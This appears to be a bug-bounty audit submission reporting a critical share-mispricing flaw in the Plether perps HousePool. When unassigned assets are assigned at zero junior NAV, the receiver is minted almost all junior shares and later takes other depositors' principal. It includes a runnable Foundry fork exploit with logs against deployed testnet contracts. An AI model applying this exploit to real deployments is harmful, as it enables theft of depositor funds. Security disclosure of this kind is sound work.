# \#98375 [SC-Critical] Assigning unassigned assets at zero junior NAV pays the receiver the existing junior principal

**Submitted on Nov 7th 2026 at 13:41:19 UTC by @Omisanin0 for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #98375
- **Report Type:** Smart Contract
- **Report severity:** Critical
- **Target:** https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol
- **Impacts:**
  - Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield

## Description

## Brief/Intro

`assignUnassignedAssets` asks the junior vault for a share count before it adds the assigned amount to `juniorPrincipal`. The vault prices that count as `assets * (supply + 1000) / (principal + 1)`. After a loss has wiped junior principal to 0, and the old shares are still outstanding, the denominator is 1. The receiver is minted almost the entire supply. Later revenue restores senior to its high-water mark and writes the wiped junior principal back onto that supply. The receiver redeems it. The old junior holder is paid 0.

On a local fork of the deployed Arbitrum Sepolia v2.0.0 HousePool at block 324,500,000, the owner held the existing junior book of 1,000,000.999983 USDG. A separate account, `0x131f15F1fD1024551542390614B6c7e210A911AF`, deposited 50,000.000000 USDG through `requestDeposit`. The epoch funded all 50,000 and the claim minted 50,048,848,227,851 junior shares. Junior principal was then 1,049,032.980243 USDG. The owner later assigned 800,000 USDG that a recap had left unassigned. The receiver, who started at 0 and was never minted USDG, was paid 1,849,458.259471 USDG by the pool. The gap over the 800,000 is 1,049,458.259471 USDG. The non-owner depositor was paid 0. The pre-existing junior holder was paid 0. Senior was paid 1,000,977.157491 USDG. Settlement-token supply rose by exactly 930,000 USDG: the recap, the trader margin, and the victim deposit. The profit was a HousePool transfer. It lands only because the loss is reversed. The mark is written to 1 while the long is open, the assign mints the quote, then the entry mark is written back and the close is flat. A close at the low mark would pay the trader, and there would be no restored junior principal for the assignee to redeem.

## Vulnerability Details

`CfdEngine.recapitalizePool` pulls settlement token from the engine owner into the pool and records it as a recapitalization. It mints no shares. `HousePoolPendingPreviewLib.applyClaimantRecapitalizationIntent` restores senior only up to the high-water mark. Anything left is added to `unassignedAssets`. Recapitalization does not accrue to junior principal. On this fork senior principal already equals the high-water mark, so the whole 800,000 USDG stays unassigned. The reconcile log is `unassignedAfterRecap 800000000000`.

A loss larger than junior principal is absorbed by `HousePoolWaterfallAccountingLib.absorbLoss`. Junior principal is set to 0. The remainder comes out of senior principal. The senior high-water mark is left where it was, so later revenue is supposed to repair senior before junior earns again. The unassigned balance is not part of that loss. After the mark is set to 1, the fork logs junior principal 0, senior principal 969,102.826522 USDG, and unassigned still 800,000.000000 USDG. Junior `totalSupply` at the wipe is 1,050,057,848,283,851. That is the supply at the pin plus the victim's 50,048,848,227,851 shares. The wipe does not burn those shares.

`HousePool.assignUnassignedAssets` is `onlyOwner`. The NatSpec says it assigns the quarantined balance to the selected tranche and asks the vault to mint matching shares. The owner passes a receiver and a tranche. The owner does not pass a share count. The function reconciles, reads `unassignedAssets`, and only then does this:

```solidity
uint256 shares = ITrancheVaultBootstrap(targetVault).quoteBootstrapDeposit(amount);
// ...
juniorPrincipal += amount;
unassignedAssets = 0;
ITrancheVaultBootstrap(targetVault).bootstrapMint(shares, receiver);
```

The quote is taken while junior principal is still 0. `TrancheVault.quoteBootstrapDeposit` calls `_convertToSharesUsingAssets(assets, _depositPricingAssets(), Floor)`. Pricing assets are the pending junior principal. The conversion is:

```solidity
assets * (accruedTotalSupply() + 1000) / (pricingAssets + 1)
```

`VIRTUAL_SHARES` is 1000. With pricing assets equal to 0 the division is by 1, so the receiver is minted `amount * (supply + 1000)` shares. For the 800,000.000000 USDG on this fork that is `800000000000 * (1050057848283851 + 1000) = 840046278627880800000000000`. The test logs that number both before the call, from `quoteBootstrapDeposit`, and after it, from the receiver's balance. They match.

An ordinary deposit does not do this. `TrancheVault.estimateDepositShares` returns 0 when pricing assets are 0 and supply is nonzero. `HousePool._settleLpEpoch` defers junior deposit activation in that same state (`pricingAssets == 0 && pricingSupply != 0`). `quoteBootstrapDeposit` has neither check. `bootstrapMint` only mints and stamps `lastDepositTime`. It does not look at the principal.

Closing the position at the entry mark removes the mark-to-market loss. `distributeRevenue` fills `seniorHighWaterMark - seniorPrincipal` first, then adds the remainder to junior principal. The remainder includes the junior principal that `absorbLoss` had wiped, because the high-water mark never fell. After the close the fork logs junior principal 1,849,467.643394 USDG and senior principal 1,000,969.024835 USDG. The assigned 800,000 is inside the junior number. So is the junior principal that was wiped, including the non-owner deposit. The 50,000 is taken on that round trip. A close at the low mark would pay the trader the long's profit. `distributeRevenue` would not write the wiped junior principal back, and the assignee would have none of that book to redeem.

The receiver's share of the supply is `840046278627880800000000000 / (840046278627880800000000000 + 1050057848283851)`. The supply that existed at the wipe is about one part in 10^12 of the new supply. The restored principal therefore belongs to the receiver. The non-owner depositor's redeem is funded with 0 assets. The pre-existing holder's redeem of every share above the seed floor is funded with 0 assets.

The release config sets `maxSeniorShareBps` to 8000. `HousePoolSeniorCapacityLib.juniorWithdrawalRatioCap` keeps enough junior principal to back senior exposure at that ratio, about one quarter of senior principal. A junior redeem taken while senior is still outstanding stops at that floor, which is why the test redeems senior first. Senior is paid its own principal. The cap then drops away and the receiver's redeem pays the restored junior. The order is required to get the cash out. It is not a second bug. The share count was already wrong at the assign.

`packages/perps/SECURITY.md` describes this owner action as assigning unowned accounted assets through the guarded bootstrap path, and it says these powers do not permit withdrawal of existing claimant backing. The 1,049,458.259471 USDG paid above the assigned 800,000 is junior backing. 50,000.000000 of it is the non-owner deposit. The rest is the junior principal that was already in the pool. A weekend coupon of 968.019740 USDG moved from junior to senior before the deposit settled, and senior's redeem includes it. Senior is not the source of the theft.

An assign made while junior principal is still positive prices against that principal. The new shares then take a normal fraction of later recovery. This quote runs after principal has already been written to 0, with the old supply still in place. The payout is also not a positive terminal delta paid during the loss. The assign happens while the book is negative. The cash moves on a later redeem, after `distributeRevenue` has rewritten the principal.

## Impact Details

Impact: Direct theft of any user funds, whether at rest or in motion, other than unclaimed yield. Critical.

The stolen amount is junior deposit principal. It is not coupon, carry, or a bounty. The old holder requested a redeem of every share the seed floor allows and was paid nothing. Those shares left the wallet. `holderSharesLeft 1000000000` is the 1,000,000,000 seed shares that stayed, because the seed receiver cannot request them. They were not paid either.

The run is a local fork of the contracts already deployed on Arbitrum Sepolia. HousePool `0xeB5604c393843B2f3c347Ec24Fa9dDaD6Ab2131e`, runtime hash `0x5e684cc82bfc5b697a24c80ef26910cfbe25efbe6fb2ca184c421808b5ced957`, which is the v2.0.0 release hash. Block 324,500,000. Chain id 421,614. The settlement token is the deployed token at `0x3d051DbBf5Ff427a4aE8Ad09746902666Af8FB9D`, 6 decimals. The protocol prices it 1:1. It has no external market. Perps is not on Arbitrum One, so the dollar figures below are that 1:1 unit. USDG amounts are atoms divided by 10^6.

| Account | Started with | Paid by the pool | Difference |
|---|---:|---:|---:|
| Non-owner junior `0x131f15F1fD1024551542390614B6c7e210A911AF` | 50,000.000000 deposited, 50,048,848,227,851 shares | 0 | -50,000.000000 |
| Pre-existing junior `0x5a71a4094Ec81165Ada48AA4c27dA48ec27E0d6B` | 1,000,000.999983 principal, the whole supply at the pin | 0 | paid 0 |
| Assignee `0xB0fD278cE219CecaC30718a5cd696482adad9ee8` | 0 | 1,849,458.259471 | +1,849,458.259471 |
| Senior, same address as the pre-existing junior | 1,000,001.000017 principal | 1,000,977.157491 | pin principal + 968.019740 + 8.137734 |

Of the assignee's 1,849,458.259471, the 800,000.000000 is the recap that had just been assigned. The other 1,049,458.259471 is 50,000.000000 from the non-owner, plus 999,032.980243 of the original junior book, plus 425.279228. The 999,032.980243 is the pin junior of 1,000,000.999983 minus 968.019740. That 968.019740 is the drop in junior principal between the pin and the post-deposit claim, apart from the 50,000 that was added: `1,000,000.999983 + 50,000 - 1,049,032.980243 = 968.019740`. Senior's 1,000,977.157491 is its starting 1,000,001.000017 plus that 968.019740 plus 8.137734. The coupon is that residual. It is not a separate log line, and it is not the theft. Pool cash left at the end of the test is 1.251267 USDG. Token supply increased by 930,000.000000 USDG and no more. That increase is the 800,000 recap, the 80,000 trader deposit, and the 50,000 victim deposit. The assignee's wallet balance equals the redeem. The victim's wallet balance equals 0. Nothing in the profit was minted to the assignee.

The same HousePool's `juniorPrincipal` at the head, read while this report was written, is 101,027,075.118601 USDG. That is the live junior book on this deployment, in the same 1:1 unit. The fork's measured theft is the 1,049,458.259471 above the assigned 800,000, of which 50,000.000000 is the non-owner deposit. The test did not take the 101,027,075.118601 balance. The share math does not change with the size of the book.

## References

- `packages/perps/src/HousePool.sol`: `assignUnassignedAssets` (line 660). The quote is line 685. `juniorPrincipal += amount` is line 699. `bootstrapMint` is line 702. Junior deposit activation is skipped at line 917 when pricing assets are 0 and supply is not.
- `packages/perps/src/TrancheVault.sol`: `estimateDepositShares` returns 0 in this state (line 1366). `quoteBootstrapDeposit` (line 1392) does not. `_convertToSharesUsingAssets` (line 1853). `_depositPricingAssets` (line 1848). `bootstrapMint` (line 1549). `VIRTUAL_SHARES` is 1000 (line 36).
- `packages/perps/src/libraries/HousePoolWaterfallAccountingLib.sol`: `absorbLoss` zeros junior first and does not lower the senior high-water mark (line 167). `distributeRevenue` restores senior, then credits junior (line 140).
- `packages/perps/src/libraries/HousePoolPendingPreviewLib.sol`: `applyClaimantRecapitalizationIntent` (line 111). Remainder becomes unassigned. It is not junior principal.
- `packages/perps/src/libraries/HousePoolSeniorCapacityLib.sol`: `juniorWithdrawalRatioCap` (line 64). Release `maxSeniorShareBps` is 8000.
- `packages/perps/src/CfdEngine.sol`: `recapitalizePool` (line 632) transfers the token and mints no shares.
- `packages/perps/SECURITY.md`, "Instant owner controls": assigning unowned accounted assets through the guarded bootstrap path does not permit withdrawal of existing claimant backing.
- Deployed v2.0.0 release `deployments/releases/2026-10-28-perps-arbitrum-sepolia-v2.0.0/`, source `1209ca8a5b94a4fb6323c7c4585846ed93db3932`. The fork checks the HousePool runtime hash from that manifest.

## Proof of Concept

## Proof of Concept

Local fork only. 

Run from `audit-comp-plether/packages/perps`. That directory's `foundry.toml` is the config: solc 0.8.35, `via_ir = true`, optimizer on, 200 runs. No other config file. No private key. The only env var is optional.

```bash
cd audit-comp-plether/packages/perps && forge test --match-contract F1120ZeroNavAssignFork --threads 1 -vv
```

If `ARB_SEPOLIA_RPC_URL` is unset, the test forks `https://arbitrum-sepolia.gateway.tenderly.co` at block 324,500,000. The RPC has to be an archive node for that block. `setUp` checks chain id 421614 and the HousePool codehash above. If either check fails, the test stops.

No contract is deployed. Pyth is not called. The settlement token is the one already on the fork. Its `mint` is public on this release. The test uses it to fund the 800,000 recap, the trader's 80,000 margin deposit, and the non-owner's 50,000 junior deposit. The 50,000 enters through `requestDeposit`, epoch settlement, and `claimDeposit`. The assignee is never the recipient of `mint`.

Two calls are made in the router's name, on the fork, because those functions are `onlyRouter` in production: `CfdEngine.updateMarkPrice` and `CfdEngine.processOrderTyped`. The mark has to fall far enough to wipe the junior principal, including the new 50,000. A live FX basket will not print a price of 1, and the bug is the share quote once junior principal is 0, not the oracle. The open and the close use the same `processOrderTyped` path the router uses after it has a price. The owner calls are the real owner functions: `recapitalizePool` as `engine.owner()`, and `assignUnassignedAssets` as `pool.owner()`. On this deployment those two owners are the same address. The depositor and the receiver are different addresses, and neither is the owner.

The fork block is Saturday 2026-10-31 00:29:10 UTC. Deposits and `assignUnassignedAssets` both revert while the oracle is frozen. The test warps the local clock forward once, to Sunday 2026-11-01 22:30:00 UTC (timestamp 1,793,572,200), which is after the 17:00 New York open, and refreshes the stored mark at the same price. The deposit then settles at the next epoch, Sunday 23:00 UTC, still inside the live window. The clock is not moved backward. The calendar read is the deployed engine's `isOracleFrozen()`.

The deposit has to happen before the recap. `unassignedAssets > 0` closes ordinary deposits, and a wiped junior cannot deposit at all.

Steps:

1. Fork block 324,500,000. The owner holds every junior share. Assignee balance is 0. The victim address holds no shares. Unassigned is 0.
2. Warp to timestamp 1,793,572,200. `isOracleFrozen` is false. Refresh the cached mark at its current price.
3. Mint 50,000 USDG to `0x131f15F1fD1024551542390614B6c7e210A911AF` and `requestDeposit` that amount on the junior vault. Settle epoch 498215. The claimable assets are 50,000.000000. `claimDeposit` mints 50,048,848,227,851 shares. Junior principal is 1,049,032.980243 USDG. The victim's USDG balance is 0.
4. Mint 800,000 USDG to the engine owner and call `recapitalizePool`. Reconcile. Unassigned is 800,000.000000 USDG. None of it is credited to junior.
5. Refresh the cached mark. Deposit 80,000 USDG to the clearinghouse for the trader and open a long of 11,273 lots at mark 96,066,417, with 50,000 USDG of margin, through `processOrderTyped`. The size stays inside the 40% skew cap and its max profit clears the new junior principal.
6. Set the mark to 1 and reconcile. Junior principal is 0. The victim's shares are still there. Senior principal is 969,102.826522 USDG. Unassigned is still 800,000. `quoteBootstrapDeposit` returns 840,046,278,627,880,800,000,000,000 shares. That is `800000000000 * (1050057848283851 + 1000)`.
7. The owner calls `assignUnassignedAssets(false, assignee)`. The assignee's share balance equals the quote. Junior principal is 800,000. Unassigned is 0.
8. Restore the entry mark, close the full size flat, reconcile. Junior principal is 1,849,467.643394 USDG. Senior principal is 1,000,969.024835 USDG. This close is the reverse of the wipe. A close at mark 1 would pay the trader and would leave the wiped junior principal unrestored.
9. Redeem senior, then the assignee, then the non-owner depositor, then the original junior holder.
10. The assignee has been paid 1,849,458.259471 USDG. The non-owner depositor has been paid 0. The original junior holder has been paid 0. Senior has been paid 1,000,977.157491 USDG. Token supply is higher by 930,000.000000 USDG.

The test locks the theft with `assertGt(assigneeOut, RECAP_ASSETS + juniorBefore + VICTIM_DEPOSIT - 5_000e6)`, `assertLt(victimOut, 1_000e6)`, `assertLt(holderOut, 1_000e6)`, `assertGt(seniorOut, 900_000e6)`, and `assertEq` on the supply increase and on both wallet balances. One run printed:

```text
forkBlock 324500000
poolCashBefore 2000002000000
juniorPrincipalBefore 1000000999983
seniorPrincipalBefore 1000001000017
juniorHolder 0x5a71a4094Ec81165Ada48AA4c27dA48ec27E0d6B
juniorHolderShares 1000009000056000
juniorSupply 1000009000056000
assigneeUsdgBefore 0
liveTimestamp 1793572200
engineFrozen 0
victim 0x131f15F1fD1024551542390614B6c7e210A911AF
victimDepositRequest 498215
victimDepositAssets 50000000000
victimClaimableAssets 50000000000
victimShares 50048848227851
juniorPrincipalAfterVictim 1049032980243
unassignedAfterRecap 800000000000
openLots 11273
entryPrice 96066417
juniorWiped 0
seniorWiped 969102826522
unassignedAtWipe 800000000000
quotedShares 840046278627880800000000000
supplyAtWipe 1050057848283851
assigneeShares 840046278627880800000000000
juniorPrincipalAfterAssign 800000000000
juniorRestored 1849467643394
seniorRestored 1000969024835
redeemAccount 0x5a71a4094Ec81165Ada48AA4c27dA48ec27E0d6B
redeemShares 999983000305994
claimableShares 999983000305994
claimableShares 0
redeemedAssets 1000977157491
redeemAccount 0xB0fD278cE219CecaC30718a5cd696482adad9ee8
redeemShares 840046278627880800000000000
claimableShares 840046164960556949233488539
claimableShares 0
redeemedAssets 1849458259471
redeemAccount 0x131f15F1fD1024551542390614B6c7e210A911AF
redeemShares 50048848227851
claimableShares 0
redeemedAssets 0
redeemAccount 0x5a71a4094Ec81165Ada48AA4c27dA48ec27E0d6B
redeemShares 1000008000056000
claimableShares 0
redeemedAssets 0
assigneeOut 1849458259471
assigneeOutUsdg 1849458
stolenJuniorUsdg 1049458
victimJuniorOut 0
victimLostUsdg 50000
holderJuniorOut 0
holderSharesLeft 1000000000
seniorOut 1000977157491
poolCashAfter 1251267
poolPaid 2850000748733
tokenSupplyIncrease 930000000000
```

`stolenJuniorUsdg 1049458` is the whole-token truncation of 1,049,458.259471. The atom gap is `1849458259471 - 800000000000 = 1049458259471`. `victimLostUsdg 50000` is the full 50,000.000000 deposit. Forge reported 1 test passed.

Full test, `audit-comp-plether/packages/perps/test/perps/fork/F1120ZeroNavAssignFork.t.sol`:

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {console2} from "forge-std/console2.sol";
import {Test} from "forge-std/Test.sol";

/// @notice Fork PoC. 
/// @dev Run from `packages/perps` with that directory's foundry.toml
///      (solc 0.8.35, via_ir, optimizer runs 200):
///
///        forge test --match-contract F1120ZeroNavAssignFork --threads 1 -vv
///
///      Optional env: ARB_SEPOLIA_RPC_URL. If unset, the test forks
///      https://arbitrum-sepolia.gateway.tenderly.co at block 324500000.
///      No contract is deployed. Pyth is not called. USDG is the token already on the fork.
///      `mint` is that token's own public mint. It funds the recap, the trader margin, and
///      the non-owner junior's deposit. That deposit enters through `requestDeposit` and the
///      epoch settlement. The assignee is never minted. The profit is a HousePool transfer.
contract F1120ZeroNavAssignForkTest is Test {

    uint256 constant FORK_BLOCK = 324_500_000;
    /// @dev Sunday 2026-11-01 22:30:00 UTC, after the 17:00 New York FX open (standard time).
    uint256 constant LIVE_TS = 1_793_572_200;
    uint256 constant RECAP_ASSETS = 800_000e6;
    /// @dev Large enough to be its own principal, and small enough that one long under the 40% skew cap
    ///      still wipes junior after the 800,000 recap has deepened the pool.
    uint256 constant VICTIM_DEPOSIT = 50_000e6;
    uint256 constant TRADER_DEPOSIT = 80_000e6;
    uint256 constant TRADER_MARGIN = 50_000e6;
    address constant POOL = 0xeB5604c393843B2f3c347Ec24Fa9dDaD6Ab2131e;
    address constant JUNIOR = 0x4A8b67184a1E3224c11A191cc69F22C50EEf734e;
    address constant SENIOR = 0x5Dc42Ba5a1E8DD3E1B6868D10f66A9bf8Fb5B83d;
    address constant ENGINE = 0xcA18a6783D7542F9D2F28F4f259772b74C4D6bAA;
    address constant CLEARINGHOUSE = 0xB5B851f627d6Df3CF3F096E23e20a58884D7b89A;
    address constant TOKEN = 0x3d051DbBf5Ff427a4aE8Ad09746902666Af8FB9D;
    bytes32 constant POOL_CODEHASH = 0x5e684cc82bfc5b697a24c80ef26910cfbe25efbe6fb2ca184c421808b5ced957;

    IUsdG internal token;
    IPool internal pool;
    IVault internal junior;
    IVault internal senior;
    IEngine internal engine;

    address internal owner;
    address internal router;
    address internal trader;
    address internal assignee;
    address internal victim;

    function setUp() public {
        string memory rpc = vm.envOr("ARB_SEPOLIA_RPC_URL", string("https://arbitrum-sepolia.gateway.tenderly.co"));
        vm.createSelectFork(rpc, FORK_BLOCK);
        assertEq(block.chainid, 421_614, "fork must be Arbitrum Sepolia");
        assertEq(POOL.codehash, POOL_CODEHASH, "fork is not the v2.0.0 HousePool");

        token = IUsdG(TOKEN);
        pool = IPool(POOL);
        junior = IVault(JUNIOR);
        senior = IVault(SENIOR);
        engine = IEngine(ENGINE);
        owner = pool.owner();
        router = engine.orderRouter();
        trader = makeAddr("trader");
        assignee = makeAddr("assignee");
        victim = makeAddr("victim");
    }

    function test_Fork_ZeroJuniorNavAssignCapturesExistingJunior() public {
        uint256 juniorBefore = pool.juniorPrincipal();
        uint256 seniorBefore = pool.seniorPrincipal();
        uint256 poolBefore = token.balanceOf(POOL);
        uint256 supplyBefore = token.totalSupply();
        uint256 holderShares = junior.balanceOf(owner);
        console2.log("forkBlock", FORK_BLOCK);
        console2.log("poolCashBefore", poolBefore);
        console2.log("juniorPrincipalBefore", juniorBefore);
        console2.log("seniorPrincipalBefore", seniorBefore);
        console2.log("juniorHolder", owner);
        console2.log("juniorHolderShares", holderShares);
        console2.log("juniorSupply", junior.totalSupply());
        console2.log("assigneeUsdgBefore", token.balanceOf(assignee));

        assertEq(pool.unassignedAssets(), 0, "pin has no unassigned cash");
        assertGt(juniorBefore, 900_000e6, "pin junior principal moved");
        assertEq(holderShares, junior.totalSupply(), "pin junior supply is not the one holder");
        assertEq(token.balanceOf(assignee), 0, "assignee must start with no USDG");
        assertTrue(victim != owner && victim != assignee, "victim must be a separate account");
        assertEq(junior.balanceOf(victim), 0, "victim must start with no junior shares");

        // Saturday blocks deposits and assign. Move to Sunday while junior principal is intact.
        // The outside deposit has to land before the recap: unassigned cash closes ordinary deposits.
        _warpUntilOracleLive();
        _refreshMark(engine.lastMarkPrice());
        _depositJunior(victim, VICTIM_DEPOSIT);
        uint256 juniorAfterDeposit = pool.juniorPrincipal();
        console2.log("juniorPrincipalAfterVictim", juniorAfterDeposit);
        assertGt(junior.balanceOf(victim), 0, "victim received no junior shares");
        assertEq(token.balanceOf(victim), 0, "victim deposit did not leave the wallet");
        assertGt(
            juniorAfterDeposit,
            juniorBefore + VICTIM_DEPOSIT - 1_000e6,
            "victim deposit did not become junior principal"
        );

        // Documented owner recap. Senior is already at its high-water mark, so the
        // cash is quarantined as unassigned and is not minted as junior shares.
        _mintAndRecap(RECAP_ASSETS);
        vm.prank(JUNIOR);
        pool.reconcile();
        uint256 parked = pool.unassignedAssets();
        console2.log("unassignedAfterRecap", parked);
        assertEq(parked, RECAP_ASSETS, "flat senior HWM leaves the recap unassigned");

        _refreshMark(engine.lastMarkPrice());
        _fundTrader();
        uint256 lots = _lotsThatWipeJunior(pool.juniorPrincipal());
        uint256 entry = engine.lastMarkPrice();
        console2.log("openLots", lots);
        console2.log("entryPrice", entry);
        _openLong(lots, entry);

        _refreshMark(1);
        vm.prank(JUNIOR);
        pool.reconcile();
        uint256 wiped = pool.juniorPrincipal();
        uint256 quoted = junior.quoteBootstrapDeposit(pool.unassignedAssets());
        console2.log("juniorWiped", wiped);
        console2.log("seniorWiped", pool.seniorPrincipal());
        console2.log("unassignedAtWipe", pool.unassignedAssets());
        console2.log("quotedShares", quoted);
        console2.log("supplyAtWipe", junior.totalSupply());
        assertEq(wiped, 0, "loss did not wipe junior principal");
        assertGt(quoted, junior.totalSupply(), "zero-NAV quote did not exceed the existing supply");
        assertGt(junior.balanceOf(victim), 0, "wipe burned the victim's shares");
        require(!engine.isOracleFrozen(), "assign window is frozen");

        vm.prank(owner);
        pool.assignUnassignedAssets(false, assignee);
        console2.log("assigneeShares", junior.balanceOf(assignee));
        console2.log("juniorPrincipalAfterAssign", pool.juniorPrincipal());
        assertEq(pool.unassignedAssets(), 0, "assign must consume the parked cash");
        assertEq(junior.balanceOf(assignee), quoted, "receiver was not minted the zero-NAV quote");

        _refreshMark(entry);
        _closeLong(entry);
        vm.prank(JUNIOR);
        pool.reconcile();
        uint256 juniorRestored = pool.juniorPrincipal();
        uint256 seniorRestored = pool.seniorPrincipal();
        console2.log("juniorRestored", juniorRestored);
        console2.log("seniorRestored", seniorRestored);
        assertGt(juniorRestored, juniorBefore, "restored junior does not include the pre-wipe principal");

        // Senior leaves first. While it is outstanding, an 80% share covenant traps the
        // junior capital that backs it, so the captured shares cannot be redeemed in full.
        uint256 seniorOut = _redeem(senior, owner);
        uint256 assigneeOut = _redeem(junior, assignee);
        uint256 victimOut = _redeem(junior, victim);
        uint256 holderOut = _redeem(junior, owner);
        uint256 poolAfter = token.balanceOf(POOL);
        console2.log("assigneeOut", assigneeOut);
        console2.log("assigneeOutUsdg", assigneeOut / 1e6);
        console2.log("stolenJuniorUsdg", (assigneeOut - RECAP_ASSETS) / 1e6);
        console2.log("victimJuniorOut", victimOut);
        console2.log("victimLostUsdg", (VICTIM_DEPOSIT - victimOut) / 1e6);
        console2.log("holderJuniorOut", holderOut);
        console2.log("holderSharesLeft", junior.balanceOf(owner));
        console2.log("seniorOut", seniorOut);
        console2.log("poolCashAfter", poolAfter);
        uint256 cashIn = RECAP_ASSETS + VICTIM_DEPOSIT;
        console2.log("poolPaid", poolBefore + cashIn > poolAfter ? poolBefore + cashIn - poolAfter : 0);
        console2.log("tokenSupplyIncrease", token.totalSupply() - supplyBefore);

        assertGt(
            assigneeOut,
            RECAP_ASSETS + juniorBefore + VICTIM_DEPOSIT - 5_000e6,
            "assignee did not take the pre-existing junior and the victim deposit"
        );
        assertLt(victimOut, 1_000e6, "non-owner junior was paid in size");
        assertLt(holderOut, 1_000e6, "existing junior holder was paid in size");
        assertGt(seniorOut, 900_000e6, "senior principal was not repaid");
        assertEq(
            token.totalSupply(),
            supplyBefore + RECAP_ASSETS + TRADER_DEPOSIT + VICTIM_DEPOSIT,
            "profit was minted"
        );
        assertEq(token.balanceOf(assignee), assigneeOut, "assignee balance is not the redeem");
        assertEq(token.balanceOf(victim), victimOut, "victim balance is not the redeem");
    }

    /// @dev Production junior deposit. The minted tokens are this account's deposit, and they enter
    ///      through the vault's request, epoch settlement, and claim. No shares are minted here.
    function _depositJunior(
        address account,
        uint256 amount
    ) internal {
        token.mint(account, amount);
        vm.startPrank(account);
        token.approve(JUNIOR, amount);
        uint256 requestId = junior.requestDeposit(amount, account, account);
        vm.stopPrank();
        console2.log("victim", account);
        console2.log("victimDepositRequest", requestId);
        console2.log("victimDepositAssets", amount);

        uint256 maturity = pool.lpEpochStart(requestId);
        if (block.timestamp <= maturity) vm.warp(maturity + 1);
        require(_settleEpoch(), "victim deposit epoch did not settle");
        uint256 claimable = junior.claimableDepositRequest(requestId, account);
        console2.log("victimClaimableAssets", claimable);
        require(claimable == amount, "victim deposit was not fully funded");
        vm.prank(account);
        uint256 sharesMinted = junior.claimDeposit(requestId, claimable, account, account);
        console2.log("victimShares", sharesMinted);
    }

    function _mintAndRecap(
        uint256 amount
    ) internal {
        address engineOwner = engine.owner();
        token.mint(engineOwner, amount);
        vm.startPrank(engineOwner);
        token.approve(ENGINE, amount);
        engine.recapitalizePool(amount);
        vm.stopPrank();
    }

    function _fundTrader() internal {
        token.mint(trader, TRADER_DEPOSIT);
        vm.startPrank(trader);
        token.approve(CLEARINGHOUSE, TRADER_DEPOSIT);
        IClearinghouse(CLEARINGHOUSE).deposit(trader, TRADER_DEPOSIT);
        vm.stopPrank();
    }

    /// @dev One long whose max profit clears the live junior principal and stays inside the 40% skew cap.
    function _lotsThatWipeJunior(
        uint256 juniorAssets
    ) internal view returns (uint256 lots) {
        uint256 mark = engine.lastMarkPrice();
        uint256 depth = token.balanceOf(POOL);
        uint256 maxSkew = depth * 40 / 100;
        uint256 target = juniorAssets + 50_000e6;
        uint256 skewCap = maxSkew * 95 / 100;
        if (target > skewCap) target = skewCap;
        lots = target / mark;
        require(lots * mark > juniorAssets, "skew cap cannot wipe junior");
    }

    function _openLong(
        uint256 lots,
        uint256 price
    ) internal {
        uint64 published = engine.lastMarkTime();
        uint256 depth = pool.totalAssets();
        vm.prank(router);
        engine.processOrderTyped(
            IEngine.Order({
                account: trader,
                sizeDelta: lots * 1e20,
                marginDelta: TRADER_MARGIN,
                targetPrice: price,
                commitTime: published,
                commitBlock: uint64(block.number),
                orderId: 0,
                side: 0,
                isClose: false
            }),
            price,
            depth,
            published
        );
    }

    function _closeLong(
        uint256 price
    ) internal {
        (uint256 size,,,,,,) = engine.positions(trader);
        uint64 published = engine.lastMarkTime();
        uint256 depth = pool.totalAssets();
        vm.prank(router);
        engine.processOrderTyped(
            IEngine.Order({
                account: trader,
                sizeDelta: size,
                marginDelta: 0,
                targetPrice: price,
                commitTime: published,
                commitBlock: uint64(block.number),
                orderId: 0,
                side: 0,
                isClose: true
            }),
            price,
            depth,
            published
        );
    }

    /// @dev The fork pin is Saturday. Deposits and assign both revert while the oracle is frozen.
    ///      Sunday 22:30 UTC is after the 17:00 New York open. Call this before the victim deposit,
    ///      while junior principal is still intact.
    function _warpUntilOracleLive() internal {
        vm.warp(LIVE_TS);
        console2.log("liveTimestamp", block.timestamp);
        console2.log("engineFrozen", engine.isOracleFrozen() ? 1 : 0);
        require(block.timestamp == LIVE_TS, "warp did not stick");
        require(!engine.isOracleFrozen(), "engine frozen at the Sunday open");
    }

    function _refreshMark(
        uint256 price
    ) internal {
        if (block.timestamp <= engine.lastMarkTime()) {
            vm.warp(uint256(engine.lastMarkTime()) + 1);
        }
        vm.prank(router);
        engine.updateMarkPrice(price, uint64(block.timestamp));
    }

    function _redeem(
        IVault vault,
        address account
    ) internal returns (uint256 assetsOut) {
        uint256 unlock = vault.lastDepositTime(account) + vault.DEPOSIT_COOLDOWN();
        if (block.timestamp < unlock) vm.warp(unlock);
        _refreshMark(engine.lastMarkPrice());
        uint256 shares = vault.maxRequestRedeem(account);
        console2.log("redeemAccount", account);
        console2.log("redeemShares", shares);
        if (shares == 0) return 0;

        vm.prank(account);
        uint256 requestId = vault.requestRedeem(shares, account, account);
        uint256 beforeBal = token.balanceOf(account);
        // One hour funds whatever the withdrawal cap allows. Later hours drain a backlog.
        for (uint256 pass; pass < 4; ++pass) {
            uint256 target = pool.lpEpochStart(requestId) + 1 + pass * 1 hours;
            if (block.timestamp < target) vm.warp(target);
            bool progressed = _settleEpoch();
            uint256 claimable = vault.claimableRedeemRequest(requestId, account);
            console2.log("claimableShares", claimable);
            if (claimable != 0) {
                vm.prank(account);
                vault.claimRedeem(requestId, claimable, account, account);
            }
            if (!progressed || claimable == 0) break;
        }
        assetsOut = token.balanceOf(account) - beforeBal;
        console2.log("redeemedAssets", assetsOut);
    }

    /// @dev A flat book with nothing matured reverts. That is an idle epoch, not a failed exit.
    function _settleEpoch() internal returns (bool progressed) {
        _refreshMark(engine.lastMarkPrice());
        uint256 mark = engine.lastMarkPrice();
        uint64 published = engine.lastMarkTime();
        vm.prank(router);
        try pool.settleLpEpoch(mark, published) {
            return true;
        } catch (bytes memory reason) {
            if (reason.length < 4 || bytes4(reason) != IPool.HousePool__NoLpEpochProgress.selector) {
                assembly {
                    revert(add(reason, 32), mload(reason))
                }
            }
            return false;
        }
    }

}

interface IUsdG {

    function mint(address to, uint256 amount) external;
    function approve(address spender, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
    function totalSupply() external view returns (uint256);

}

interface IPool {

    error HousePool__NoLpEpochProgress();

    function owner() external view returns (address);
    function juniorPrincipal() external view returns (uint256);
    function seniorPrincipal() external view returns (uint256);
    function unassignedAssets() external view returns (uint256);
    function totalAssets() external view returns (uint256);
    function reconcile() external;
